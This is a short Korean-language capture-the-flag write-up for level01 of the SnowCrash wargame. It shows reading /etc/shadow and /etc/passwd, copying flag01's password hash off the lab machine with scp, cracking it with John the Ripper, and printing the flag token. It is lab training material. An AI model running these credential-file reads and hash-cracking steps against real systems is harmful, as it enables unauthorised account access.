# Level01

## /etc/shadow에서 비밀번호조회

```zsh
evel01@SnowCrash:~$ cat /etc/shadow
cat: /etc/shadow: Permission denied
level01@SnowCrash:~$ ls -al /etc/shadow
-rw-r----- 1 root shadow 4428 Mar  6  2016 /etc/shadow
```

## /etc/passwd에 접근

```zsh
level01@SnowCrash:~$ cat /etc/passwd | grep flag01
flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
```

/etc/passwd에 저장된 비밀번호는 일반적으로 암호화된 상태로 저장됩니다. 예를 들어, MD5나 SHA-256과 같은 해시 함수를 사용하여 암호화될 수 있습니다

## john the ripper로 "42hDRfypTqqnw" 복호화

### 1. SCP 패스워드를 파일로 저장 및 로컬로 이동

```zsh
cat /etc/passwd | grep flag01 | cut -d":" -f 2 > /tmp/passwd
```

로컬에서

```zsh
$> scp -P 4242 level01@192.168.56.2:/tmp/passwd ./

           _____                      _____               _
          / ____|                    / ____|             | |
         | (___  _ __   _____      _| |     _ __ __ _ ___| |__
          \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \
          ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
         |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|

  Good luck & Have fun

          192.168.56.2
level01@192.168.56.2's password:
passwd                                                   100%   14     5.9KB/s   00:00

$> john ./passwd --show
?:abcdefg

1 password hash cracked, 0 left
```

ssh

```zsh
flag01@SnowCrash:~$ getflag
Check flag.Here is your token : f2av5il02puano7naaf6adaaf
flag01@SnowCrash:~$ su level02
Password:
level02@SnowCrash:~$
```
